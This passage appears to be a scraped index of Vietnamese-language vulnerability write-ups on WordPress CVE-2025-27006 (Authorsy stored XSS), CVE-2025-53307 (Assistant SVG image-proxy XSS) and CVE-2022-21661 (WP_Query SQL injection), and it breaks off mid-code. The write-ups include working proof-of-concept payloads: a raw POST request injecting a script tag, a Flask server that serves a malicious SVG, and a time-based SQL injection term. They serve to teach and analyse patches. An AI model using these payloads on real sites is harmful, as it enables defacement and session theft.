function authorsy_get_option( $key = \u0026#39;\u0026#39;, $default = false ) { $options = get_option( \u0026#39;authorsy_settings\u0026#39; ); $value = $default; if ( isset( $options[$key] ) ) { $value = ! empty( $options[$key] ) ? $options[$key] : $default; } return $value; } authorsy_get_option l·∫•y m·∫£ng t·∫•t c·∫£ c√°c option c·ªßa plugin Authorsy ƒë∆∞·ª£c l∆∞u trong b·∫£ng wp_options b·∫±ng get_option('authorsy_settings').\nSau ƒë√≥ ki·ªÉm tra xem key c√≥ t·ªìn t·∫°i trong m·∫£ng options kh√¥ng. N·∫øu gi√° tr·ªã kh√¥ng r·ªóng, g√°n v√†o $value, n·∫øu r·ªóng th√¨ gi·ªØ default.\nüëâ V√¨ d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u tr·ªØ r·ªìi m·ªõi render ra HTML n·∫øn ƒë√¢y l√† Stored XSS\nKhi truy c·∫≠p /wp-json/authorsy/v1/settings v·ªõi method POST =\u0026gt; update_settings ƒë∆∞·ª£c g·ªçi kh√¥ng y√™u c·∫ßu ƒë·∫∑c quy·ªÅn.\npublic function update_settings( $request ) { $options = json_decode( $request-\u0026gt;get_body(), true ); $this-\u0026gt;verify_nonce( $request ); $data = [ \u0026#39;status_code\u0026#39; =\u0026gt; 200, \u0026#39;success\u0026#39; =\u0026gt; 1, \u0026#39;message\u0026#39; =\u0026gt; esc_html__( \u0026#39;Settings successfully updated\u0026#39;, \u0026#39;authorsy\u0026#39; ), \u0026#39;data\u0026#39; =\u0026gt; authorsy_get_settings(), ]; if ( $options ) { foreach ( $options as $key =\u0026gt; $value ) { authorsy_update_option( $key, $value ); } } $data[\u0026#39;data\u0026#39;] = authorsy_get_settings(); return rest_ensure_response( $data ); } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\nH√†m update_settings nh·∫≠n d·ªØ li·ªáu JSON t·ª´ request, decode th√†nh c√°c c·∫∑p key-value v√† c·∫≠p nh·∫≠t ch√∫ng v√†o c∆° s·ªü d·ªØ li·ªáu. Tr∆∞·ªõc khi th·ª±c hi·ªán update, ·ª©ng d·ª•ng g·ªçi $this-\u0026gt;verify_nonce( $request ); ƒë·ªÉ ki·ªÉm tra nonce.\npublic static function verify_nonce($request) { $nonce = $request-\u0026gt;get_header(\u0026#39;X-WP-Nonce\u0026#39;); if (!wp_verify_nonce($nonce, \u0026#39;wp_rest\u0026#39;)) { return new \\WP_Error(\u0026#39;invalid_nonce\u0026#39;, __(\u0026#39;Invalid nonce.\u0026#39;, \u0026#39;authorsy\u0026#39;), [\u0026#39;status\u0026#39; =\u0026gt; 403]); } return true; } {: file=\u0026ldquo;wp-content/plugins/authorsy/base/api.php v1.0.5\u0026rdquo; }\nƒêi·ªÉm quan tr·ªçng:\nKhi nonce kh√¥ng h·ª£p l·ªá, h√†m ch·ªâ tr·∫£ v·ªÅ m·ªôt ƒë·ªëi t∆∞·ª£ng WP_Error, nh∆∞ng kh√¥ng d·ª´ng ch∆∞∆°ng tr√¨nh. Trong update_settings, gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa verify_nonce kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra =\u0026gt; code v·∫´n ti·∫øp t·ª•c th·ª±c hi·ªán c·∫≠p nh·∫≠t. üëâ Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªëi gi√° tr·ªã c·ªßa CSS ch·ª©a XSS payload trong database m√† kh√¥ng c·∫ßn ƒë·∫∑c quy·ªÅn g√¨ c·∫£ =\u0026gt; CSS ƒë∆∞·ª£c th√™m v√†o \u0026lt;head\u0026gt; ch·ª©a m√£ ƒë·ªôc\nExploit Detect XSS G·ª≠i POST request ƒë·∫øn /wp-json/authorsy/v1/settings v·ªõi XSS payload\nPOST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \u0026#34;primary_color\u0026#34;:\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026#34; } Ta ƒë√≥ng th·∫ª \u0026lt;style\u0026gt; (CSS trong head) v√† inject th√™m th·∫ª \u0026lt;script\u0026gt; ch·ª©a XSS payload.\nTruy c·∫≠p m·ªôt trang b·∫•t k·ª≥\nüëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o\n\u0026lt;style\u0026gt; :root { --ea-color-main: \u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;; } \u0026lt;/style\u0026gt; Conclusion L·ªó h·ªïng CVE-2025-27006 trong plugin Authorsy \u0026lt;= 1.0.5 l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ Broken Access Control k·∫øt h·ª£p v·ªõi XSS. Nguy√™n nh√¢n ch√≠nh l√†:\nREST API kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi /wp-json/authorsy/v1/settings ƒë·ªÉ thay ƒë·ªïi c√°c option. CSS t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c sanitize: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; trong \u0026lt;head\u0026gt;, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload \u0026lt;script\u0026gt; th√¥ng qua CSS. Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: verify_nonce ch·ªâ tr·∫£ v·ªÅ WP_Error m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu. Key takeaways:\nREST API c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng permission_callback h·ª£p l√Ω ƒë·ªÉ ngƒÉn Broken Access Control. Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng XSS. References Cross-site scripting (XSS) cheat sheet\nWordPress Authorsy Plugin \u0026lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","permalink":"//localhost:1313/vi/posts/2025-09-17-cve-2025-27006/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAuthorsy\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.0.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-27006\"\u003eCVE-2025-27006\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/authorsy/\"\u003eWordPress Authorsy Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.0.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (6.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOWASP Top 10\u003c/strong\u003e: A1: Broken Access Control\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTrong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn \u003cstrong\u003eSubscriber\u003c/strong\u003e nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c \u003cstrong\u003eUnauthenticated\u003c/strong\u003e.\n{: .prompt-info }\u003c/p\u003e","title":"CVE-2025-27006"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Assistant c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Assistant: v1.5.2(vul) v√† v1.5.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.\nTrong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem change log ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u:\nChangelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \u0026#34;image proxy\u0026#34; üëâ L·ªó h·ªóng n·∫±m trong file backend/src/Hooks/ImageProxy.php, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n:\nS·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m render_image v·ªõi ch·ª©c nƒÉng:\nNh·∫≠n tham s·ªë url t·ª´ query string ($_GET['url']). G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung. Ch·ªëng ssrf b·∫±ng wp_safe_remote_get. N·∫øu n·ªôi dung c√≥ header Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/, th√¨: G·ª≠i l·∫°i header Content-Type ƒë√≥ cho client. In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát. Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress. SVG c≈©ng c√≥ Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/ v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =\u0026gt; XSS c√≥ th·ªÉ x·∫£y ra. {: .prompt-tip }\nB·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra MIME type th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o.\n$filesystem = self::filesystem(); $tmpfile = tempnam( \u0026#39;/tmp\u0026#39;, \u0026#39;assistant\u0026#39; ); $filesystem-\u0026gt;put_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u0026gt;delete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±.\nN·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =\u0026gt; return false.\nHow it work? Trong __construct c·ªßa class ImageProxy, ph∆∞∆°ng th·ª©c render_image() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook 'init'. Hook 'init' ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát.\nrender_image ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë $_GET['fl_asst_image_proxy'] t·ªìn t·∫°i.\nüëâ Khi truy c·∫≠p /wp-admin/?fl_asst_image_proxy=value1\u0026amp;url=http://yoursite/image-path th√¨ render_image s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã.\nExploit Detect XSS T·∫°o 1 trang web ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload\nfrom flask import Flask, Response app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#39;Hello, World!\u0026#39; @app.route(\u0026#39;/svg\u0026#39;) def about(): svg = \u0026#34;\u0026#34;\u0026#34;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt;\u0026#34;\u0026#34;\u0026#34; return Response(svg, mimetype=\u0026#34;image/svg+xml\u0026#34;) {: file=\u0026ldquo;api/index.py\u0026rdquo;}\nG·ª≠i request ch·ª©a url param tr·ªè ƒë·∫øn https://yoursite/svg\nhttp://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026amp;url=https://yoursite/svg üëâ Th√†nh c√¥ng v·ªõi Unauthenticated v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =\u0026gt; XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.\nConclusion L·ªó h·ªïng CVE-2025-53307 trong plugin WordPress Assistant (\u0026lt;= v1.5.2) cho ph√©p XSS th√¥ng qua render_image() v√¨ kh√¥ng ki·ªÉm tra MIME type th·ª±c c·ªßa file. B·∫£n v√° v1.5.3 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát.\nKey takeaways:\nKh√¥ng tin c·∫≠y v√†o Content-Type header t·ª´ HTTP response. Lu√¥n x√°c th·ª±c MIME type th·ª±c s·ª± c·ªßa file. References Cross-site scripting (XSS) cheat sheet\nWordPress WordPress Assistant Plugin \u0026lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)\n","permalink":"//localhost:1313/vi/posts/2025-09-16-cve-2025-53307/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAssistant\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-53307\"\u003eCVE-2025-53307\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/assistant/\"\u003eWordPress Assistant Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.5.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAssistant\u003c/strong\u003e:  v1.5.2(vul) v√† v1.5.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL \u003cstrong\u003em√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type\u003c/strong\u003e. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\u003c/p\u003e","title":"CVE-2025-53307"},{"content":"Introduction Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37.\nCVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u0026lt; 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress and Debugging WordPress: v5.8.2(vul) Setup Required PHP Version WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:\nM·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u0026gt; s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2.\nVSCode Extensions WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:\nPHP Extension Pack =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode Custom Plugin V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query.\nTa x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request.\n\u0026lt;?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined(\u0026#39;ABSPATH\u0026#39;)) exit; function da_show_posts() { $args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [1,2,3], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; $query = new WP_Query($args); ob_start(); echo \u0026#39;\u0026lt;h3\u0026gt;Demo WP_Query\u0026lt;/h3\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;pre style=\u0026#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;SQL query generated by WP_Query:\\n\\n\u0026#34;; echo esc_html($query-\u0026gt;request); // Display excuted query echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($query-\u0026gt;have_posts()) { echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; while ($query-\u0026gt;have_posts()) { $query-\u0026gt;the_post(); echo \u0026#39;\u0026lt;li\u0026gt;\u0026#39; . get_the_title() . \u0026#39; (\u0026#39; . get_the_ID() . \u0026#39;)\u0026lt;/li\u0026gt;\u0026#39;; } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;p\u0026gt;No posts found.\u0026lt;/p\u0026gt;\u0026#39;; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode(\u0026#39;demo_wp_query\u0026#39;, \u0026#39;da_show_posts\u0026#39;); Taxonomy parameters\nT·∫°o page m·ªõi v·ªõi \u0026lt;page-title\u0026gt; c√≥ shortcode :\n[demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;\nAnalysis wpdb\nL√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query\nL√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá\nWP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. Patch Diff WordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.\nTrong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub:\nL·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php\nB·∫£n l·ªói\n$query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); √âp $query['terms'] th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p. Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL. V√≠ d·ª•:\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;1) AND (SELECT SLEEP(5)) # \u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; B·∫£n v√°\nif ( \u0026#39;slug\u0026#39; === $query[\u0026#39;field\u0026#39;] || \u0026#39;name\u0026#39; === $query[\u0026#39;field\u0026#39;] ) { $query[\u0026#39;terms\u0026#39;] = 